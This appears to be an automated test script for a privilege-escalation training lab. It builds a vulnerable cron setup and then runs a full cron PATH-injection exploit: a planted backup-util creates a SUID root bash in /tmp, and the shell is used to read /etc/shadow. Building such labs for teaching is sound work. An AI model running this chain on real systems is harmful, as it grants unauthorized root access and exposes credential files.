#!/bin/bash
#
# Automated Test Script for Privilege Escalation Lab
# Scenario: Cron PATH Injection → Root
#
# Must be run as root: sudo ./test_lab.sh
#

export PATH="/usr/sbin:/sbin:/usr/bin:/bin"

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Counters
PASS=0
FAIL=0

TEST_USER="developer"
TEST_PASS="developer123"
TEST_GROUP="staff"

#######################################
# Logging functions
#######################################
log_header() {
    echo ""
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${CYAN}  $1${NC}"
    echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════════════${NC}"
}

log_phase() {
    echo ""
    echo -e "${BLUE}┌──────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│ ${BOLD}$1${NC}"
    echo -e "${BLUE}└──────────────────────────────────────────────────────────────┘${NC}"
}

log_step() {
    echo -e "${YELLOW}  ► $1${NC}"
}

log_check() {
    echo -n "    [CHECK] $1 ... "
}

log_pass() {
    echo -e "${GREEN}✓ PASS${NC}"
    PASS=$((PASS + 1))
}

log_fail() {
    echo -e "${RED}✗ FAIL${NC}"
    echo -e "${RED}      Expected: $1${NC}"
    echo -e "${RED}      Got: $2${NC}"
    FAIL=$((FAIL + 1))
}

log_info() {
    echo -e "    ${CYAN}ℹ $1${NC}"
}

log_attack() {
    echo -e "    ${RED}⚔ $1${NC}"
}

# Save original /usr/local/bin permissions
ORIG_LOCAL_BIN_PERMS=""
ORIG_LOCAL_BIN_GROUP=""

#######################################
# Cleanup function
#######################################
cleanup() {
    log_phase "CLEANUP"

    pkill -u "$TEST_USER" 2>/dev/null || true
    userdel -r "$TEST_USER" 2>/dev/null || true
    groupdel "$TEST_GROUP" 2>/dev/null || true

    rm -f /etc/cron.d/backup-system 2>/dev/null || true
    rm -rf /opt/admin 2>/dev/null || true
    rm -f /usr/local/bin/backup-util 2>/dev/null || true
    rm -f /usr/bin/backup-util 2>/dev/null || true
    rm -f /var/log/backup.log 2>/dev/null || true
    rm -rf /var/data /var/backups 2>/dev/null || true

    rm -f /tmp/rootbash 2>/dev/null || true
    rm -f /tmp/pwned.txt 2>/dev/null || true

    # Restore /usr/local/bin permissions
    chmod 755 /usr/local/bin 2>/dev/null || true
    chown root:root /usr/local/bin 2>/dev/null || true

    log_info "Cleanup complete"
}

#######################################
# Pre-flight checks
#######################################
preflight() {
    log_phase "PRE-FLIGHT CHECKS"

    log_check "Running as root"
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}✗ FAIL${NC}"
        echo "This script must be run as root (sudo ./test_lab.sh)"
        exit 1
    fi
    log_pass

    log_check "useradd available"
    if command -v useradd &> /dev/null; then
        log_pass
    else
        log_fail "useradd available" "not found"
        exit 1
    fi

    # Save original permissions
    ORIG_LOCAL_BIN_PERMS=$(stat -c '%a' /usr/local/bin)
    ORIG_LOCAL_BIN_GROUP=$(stat -c '%G' /usr/local/bin)

    log_step "Cleaning any previous test artifacts..."
    cleanup
}

#######################################
# PHASE 0: Setup environment
#######################################
phase_0() {
    log_phase "PHASE 0 — Environment Setup (Simulating Sysadmin)"

    log_step "Creating staff group..."
    groupadd "$TEST_GROUP"

    log_step "Creating developer user..."
    useradd -m -s /bin/bash -G "$TEST_GROUP" "$TEST_USER"
    echo "$TEST_USER:$TEST_PASS" | chpasswd

    log_check "Developer in staff group"
    if id "$TEST_USER" | grep -q "$TEST_GROUP"; then
        log_pass
    else
        log_fail "in staff group" "not in group"
    fi

    log_step "Making /usr/local/bin writable by staff..."
    chown root:"$TEST_GROUP" /usr/local/bin
    chmod 775 /usr/local/bin

    log_check "/usr/local/bin group-writable"
    if [[ -w /usr/local/bin ]] || stat -c '%a' /usr/local/bin | grep -q "77"; then
        log_pass
    else
        log_fail "group writable" "not writable"
    fi

    log_step "Creating admin backup script..."
    mkdir -p /opt/admin
    cat > /opt/admin/backup-system.sh << 'EOF'
#!/bin/bash
LOG="/var/log/backup.log"
echo "[$(date)] Starting backup" >> "$LOG"

# Uses relative command - vulnerable!
backup-util --full /var/data

echo "[$(date)] Backup complete" >> "$LOG"
EOF
    chmod 755 /opt/admin/backup-system.sh

    log_step "Creating legitimate backup-util..."
    cat > /usr/bin/backup-util << 'EOF'
#!/bin/bash
echo "Running backup: $@"
EOF
    chmod 755 /usr/bin/backup-util

    log_step "Creating cron job with dangerous PATH..."
    cat > /etc/cron.d/backup-system << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/bin:/usr/bin:/bin
*/5 * * * * root /opt/admin/backup-system.sh
EOF
    chmod 644 /etc/cron.d/backup-system

    mkdir -p /var/data /var/backups
    touch /var/log/backup.log
    chmod 644 /var/log/backup.log

    log_info "Environment setup complete"
    log_info "Trust boundary: PATH includes writable /usr/local/bin before /usr/bin"
}

#######################################
# PHASE 1: Verify attacker has no privileges
#######################################
phase_1() {
    log_phase "PHASE 1 — Verify Attacker Starts Unprivileged"

    log_check "Developer has no sudo access"
    SUDO_CHECK=$(su - "$TEST_USER" -c 'sudo -l' 2>&1 || true)
    if echo "$SUDO_CHECK" | grep -qi "may not run sudo\|not in the sudoers\|not allowed"; then
        log_pass
    else
        log_fail "no sudo" "$SUDO_CHECK"
    fi

    log_check "Developer CAN write to /usr/local/bin"
    su - "$TEST_USER" -c 'touch /usr/local/bin/test_write && rm /usr/local/bin/test_write'
    if [[ $? -eq 0 ]]; then
        log_pass
    else
        log_fail "write access" "no write access"
    fi

    log_info "Attacker can write to /usr/local/bin but has no root access"
}

#######################################
# PHASE 2: Attacker enumeration
#######################################
phase_2() {
    log_phase "PHASE 2 — Attacker Enumeration"

    log_step "Attacker checks group memberships..."

    log_check "Developer in staff group"
    GROUPS=$(su - "$TEST_USER" -c 'groups')
    if echo "$GROUPS" | grep -q "$TEST_GROUP"; then
        log_pass
    else
        log_fail "staff membership" "$GROUPS"
    fi

    log_step "Attacker examines PATH directories..."

    log_check "Developer can write to /usr/local/bin"
    PERMS=$(ls -la /usr/local 2>/dev/null | grep "bin$")
    if echo "$PERMS" | grep -q "rwx"; then
        log_pass
        log_info "Permissions: $PERMS"
    else
        log_fail "writable" "$PERMS"
    fi

    log_step "Attacker examines cron jobs..."

    log_check "Cron PATH includes /usr/local/bin first"
    CRON_PATH=$(grep "^PATH" /etc/cron.d/backup-system)
    if echo "$CRON_PATH" | grep -q "/usr/local/bin:/usr"; then
        log_pass
        log_info "Cron PATH: $CRON_PATH"
    else
        log_fail "/usr/local/bin first" "$CRON_PATH"
    fi

    log_check "Backup script uses relative command"
    SCRIPT=$(cat /opt/admin/backup-system.sh)
    if echo "$SCRIPT" | grep -q "^backup-util\|[^/]backup-util"; then
        log_pass
    else
        log_fail "relative command" "uses absolute path"
    fi

    log_info "Attacker identifies: relative command + writable PATH directory"
}

#######################################
# PHASE 3: Exploitation
#######################################
phase_3() {
    log_phase "PHASE 3 — Exploitation"

    log_step "Attacker creates malicious backup-util in /usr/local/bin..."
    su - "$TEST_USER" -c 'cat > /usr/local/bin/backup-util << '\''EOF'\''
#!/bin/bash
# Malicious backup-util
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
echo "Pwned at $(date)" > /tmp/pwned.txt
chmod 644 /tmp/pwned.txt
EOF'
    su - "$TEST_USER" -c 'chmod +x /usr/local/bin/backup-util'

    log_check "Malicious backup-util created"
    if [[ -f /usr/local/bin/backup-util ]]; then
        log_pass
    else
        log_fail "file exists" "not found"
    fi

    log_check "Malicious version found first in PATH"
    # Test with the same PATH as cron
    WHICH_RESULT=$(PATH=/usr/local/bin:/usr/bin:/bin which backup-util)
    if [[ "$WHICH_RESULT" == "/usr/local/bin/backup-util" ]]; then
        log_pass
        log_info "which backup-util → $WHICH_RESULT"
    else
        log_fail "/usr/local/bin/backup-util" "$WHICH_RESULT"
    fi

    log_info "Malicious command staged in /usr/local/bin"
    log_attack "When cron runs backup script, our backup-util executes first"
}

#######################################
# PHASE 4: Trigger and verify
#######################################
phase_4() {
    log_phase "PHASE 4 — Root Executes Backup Script"

    log_step "Simulating cron execution with PATH=/usr/local/bin:/usr/bin:/bin..."

    # Run with the same PATH as cron
    PATH=/usr/local/bin:/usr/bin:/bin /opt/admin/backup-system.sh 2>/dev/null || true

    log_check "/tmp/rootbash exists"
    if [[ -f /tmp/rootbash ]]; then
        log_pass
    else
        log_fail "file exists" "not found (PATH hijack did not work)"
        return
    fi

    log_check "/tmp/rootbash owned by root"
    OWNER=$(stat -c '%U' /tmp/rootbash)
    if [[ "$OWNER" == "root" ]]; then
        log_pass
    else
        log_fail "root" "$OWNER"
    fi

    log_check "/tmp/rootbash has SUID bit"
    PERMS=$(stat -c '%a' /tmp/rootbash)
    if [[ "$PERMS" == "4755" ]]; then
        log_pass
    else
        log_fail "4755" "$PERMS"
    fi

    log_check "/tmp/pwned.txt created"
    if [[ -f /tmp/pwned.txt ]]; then
        log_pass
        log_info "Contents: $(cat /tmp/pwned.txt)"
    else
        log_fail "file exists" "not found"
    fi

    log_attack "SUID root shell created at /tmp/rootbash"
}

#######################################
# PHASE 5: Prove root access
#######################################
phase_5() {
    log_phase "PHASE 5 — Privilege Escalation Verification"

    if [[ ! -f /tmp/rootbash ]]; then
        log_info "Skipping — SUID shell was not created"
        return
    fi

    log_step "Attacker executes SUID shell..."

    log_check "Developer achieves euid=0 (root)"
    ID_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "id"' 2>&1)
    if echo "$ID_CHECK" | grep -q "euid=0"; then
        log_pass
        log_info "ID output: $ID_CHECK"
    else
        log_fail "euid=0(root)" "$ID_CHECK"
    fi

    log_check "Developer can read /etc/shadow"
    SHADOW_CHECK=$(su - "$TEST_USER" -c '/tmp/rootbash -p -c "head -1 /etc/shadow"' 2>&1)
    if echo "$SHADOW_CHECK" | grep -q ":"; then
        log_pass
    else
        log_fail "shadow content" "$SHADOW_CHECK"
    fi

    echo ""
    log_attack "╔═══════════════════════════════════════════════════════════╗"
    log_attack "║         PRIVILEGE ESCALATION SUCCESSFUL                   ║"
    log_attack "║                                                           ║"
    log_attack "║   Started as:  developer (uid=1001)                       ║"
    log_attack "║   Achieved:    root (euid=0)                              ║"
    log_attack "║   Method:      Cron PATH Injection                        ║"
    log_attack "╚═══════════════════════════════════════════════════════════╝"
}

#######################################
# Summary
#######################################
summary() {
    log_header "TEST SUMMARY"

    echo ""
    echo -e "  Tests passed: ${GREEN}${BOLD}$PASS${NC}"
    echo -e "  Tests failed: ${RED}${BOLD}$FAIL${NC}"
    echo ""

    if [[ $FAIL -eq 0 ]]; then
        echo -e "${GREEN}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}${BOLD}  ║           ALL TESTS PASSED — LAB IS FUNCTIONAL            ║${NC}"
        echo -e "${GREEN}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
        echo ""
        echo "  The lab correctly demonstrates:"
        echo "    1. Developer with write access to PATH directory"
        echo "    2. Cron job with dangerous PATH order"
        echo "    3. Script using relative command"
        echo "    4. PATH hijacking privilege escalation"
        echo ""
        echo "  Attack chain:"
        echo "    developer → PATH hijack → root (euid=0)"
        echo ""
    else
        echo -e "${RED}${BOLD}  ╔═══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}  ║              SOME TESTS FAILED — REVIEW OUTPUT            ║${NC}"
        echo -e "${RED}${BOLD}  ╚═══════════════════════════════════════════════════════════╝${NC}"
    fi
}

#######################################
# Main
#######################################
main() {
    log_header "Privilege Escalation Lab — Automated Test"
    echo ""
    echo "  Scenario: Custom Administration Scripts"
    echo "  Attack:   Cron PATH Injection"
    echo "  Goal:     developer → root (euid=0)"

    trap cleanup EXIT

    preflight
    phase_0
    phase_1
    phase_2
    phase_3
    phase_4
    phase_5
    summary
}

main "$@"
